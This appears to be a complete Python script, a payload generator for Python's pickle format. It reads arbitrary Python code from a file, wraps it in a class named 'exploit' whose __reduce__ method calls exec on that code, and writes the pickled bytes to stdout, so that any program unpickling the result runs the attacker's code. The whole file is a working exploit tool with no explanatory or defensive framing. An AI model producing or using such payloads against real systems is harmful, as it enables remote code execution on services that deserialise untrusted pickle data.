#!/usr/bin/env python3


from sys import argv, stdout
from pickle import dumps


def require(path):
    try:
        with open(path) as file:
            text = file.read()

        return text

    except:
        return False


def output(bytes):
    stdout.buffer.write(bytes)


class exploit:
    def __init__(self, code):
        self.code = code

    def __reduce__(self):
        return (exec, (self.code,))

    
def main():
    if len(argv) == 2:
        path = argv[1]
        code = require(path)
 
        if code:
            object = exploit(code)
            pickled = dumps(object)

            output(pickled)

        else:
            print('Yikes!, unable to read from file.')

    else:
       print('arguments: [path]')


main()
